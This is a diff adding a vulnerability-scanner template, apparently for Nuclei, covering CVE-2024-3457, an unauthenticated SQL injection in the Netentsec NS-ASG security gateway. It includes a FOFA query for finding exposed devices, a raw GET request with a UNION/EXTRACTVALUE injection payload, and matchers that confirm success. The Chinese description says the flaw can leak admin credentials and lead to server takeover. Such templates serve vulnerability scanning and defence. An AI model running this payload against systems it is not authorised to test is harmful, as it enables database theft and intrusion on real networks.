@@ -1,0 +1,29 @@
+id: wangkang-NS-config_ISCGroupNoCache_php-sql-CVE-2024-3457
+
+info:
+  name: "网康科技 NS-ASG 应用安全网关 config_ISCGroupNoCache.php SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="网康科技-NS-ASG安全网关"
+      网康科技 NS-ASG 应用安全网关的 config_ISCGroupNoCache.php 接口存在可被利用的 SQL 注入缺陷。攻击者可通过该漏洞执行恶意构造的 SQL 语句，导致数据库敏感信息泄露，并可能通过高权限操作实现服务器命令注入，进而控制目标系统。此漏洞允许未经身份验证的远程攻击者直接访问数据库内容，包括但不限于管理员凭证及用户隐私数据，最终可能达成对目标服务器的完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s/X__Np4f16YMV10qngbOdBA
+  tags: 网康科技-NS-ASG
+
+http:
+- raw:
+  - |
+    GET /admin/config_ISCGroupNoCache.php?GroupId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+MD5(123123)),0x7e)) HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '~4297f44b13955235245b2497399d7a9'
+  - type: status
+    status:
+    - 200
